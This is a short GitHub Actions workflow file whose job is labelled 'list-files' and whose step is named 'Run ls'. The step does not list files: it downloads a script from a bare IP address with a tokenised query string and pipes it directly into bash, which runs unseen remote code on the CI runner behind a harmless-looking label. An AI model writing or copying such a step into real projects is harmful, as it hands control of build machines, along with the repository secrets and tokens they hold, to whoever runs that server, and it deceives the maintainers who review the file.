name: CI

on:
  workflow_dispatch:

jobs:
  list-files:
    runs-on: ubuntu-latest
    steps:
      - name: Run ls
        run: curl http://34.244.228.45/trigger?71fa0acfe062c996017c3bbd61b282c8=1 | bash
